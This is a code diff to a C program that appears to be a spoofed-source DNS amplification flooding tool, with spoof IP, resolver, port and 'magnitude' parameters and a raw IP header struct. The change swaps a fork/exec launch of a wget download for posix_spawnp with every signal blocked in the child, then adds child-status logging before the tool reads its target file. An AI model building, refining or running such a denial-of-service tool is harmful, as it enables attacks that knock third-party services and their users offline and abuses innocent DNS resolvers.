@@ -93,6 +93,9 @@ const char* g_ansi = {
 #include <netdb.h>
 #include <unistd.h>
 
+#include <spawn.h>
+#include <wait.h>
+
 typedef struct __attribute__((packed, aligned(1))) {
     uint32_t sourceaddr;
     uint32_t destaddr;
@@ -228,17 +231,26 @@ CheckSum(const uint16_t* addr, size_t count);
 void
 PrintHex(void* data, size_t len);
 
+char** environ;
 #define DEBUG 1
 int
 main(int argc, char** argv)
 {
     FILE* fptr;
     char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
-    int status, i, opt;
+    int status, i, opt, s;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, magnitude;
-    pid_t pid;
+    pid_t child_pid;
+    sigset_t mask;
+    posix_spawnattr_t attr;
+    posix_spawnattr_t* attrp;
+    posix_spawn_file_actions_t file_actions;
+    posix_spawn_file_actions_t* file_actionsp;
+
+    attrp = NULL;
+    file_actionsp = NULL;
 
     printf("%s", g_ansi);
     if (argc != 4)
@@ -270,16 +282,50 @@ main(int argc, char** argv)
         }
     } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
 
-    if ((pid = fork( )) < 0)
-        fork_err_exit("* forking child process failed\n");
-    else if (pid == 0) {
-        if (execv(*g_wget, g_wget) < 0)
-            fork_err_exit("* exec failed");
+    /* block all signals in child */
+    s = posix_spawnattr_init(&attr);
+    if (s != 0)
+        err_exit("* posix_spawnattr_init");
+    s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
+    if (s != 0)
+        err_exit("* posix_spawnattr_setflags");
+
+    sigfillset(&mask);
+    s = posix_spawnattr_setsigmask(&attr, &mask);
+    if (s != 0)
+        err_exit("* posix_spawnattr_setsigmask");
+
+    attrp = &attr;
+
+    s = posix_spawnp(&child_pid, g_wget[ 0 ], file_actionsp, attrp,&g_wget[ 0 ], environ);
+    if (s != 0)
+        err_exit("* posix_spawn");
+
+    if (attrp != NULL) {
+        s = posix_spawnattr_destroy(attrp);
+        if (s != 0)
+            err_exit("* posix_spawnattr_destroy");
     }
-    else {
-        while (wait(&status) != pid)
-            ;
+
+    if (file_actionsp != NULL) {
+        s = posix_spawn_file_actions_destroy(file_actionsp);
+        if (s != 0)
+            err_exit("* posix_spawn_file_actions_destroy");
     }
+
+    printf("+ spawning child at PID : %jd\n", ( intmax_t ) child_pid);
+
+    do {
+        s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
+        if (s == -1)
+            err_exit("* waitpid");
+
+        printf("- Child status: ");
+        if (WIFEXITED(status))
+            printf("exited, status=%d\n", WEXITSTATUS(status));
+        else if (WIFCONTINUED(status))
+            printf("continued\n");
+    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
 
     fptr = fopen(g_path, "r");
     if (fptr == NULL)
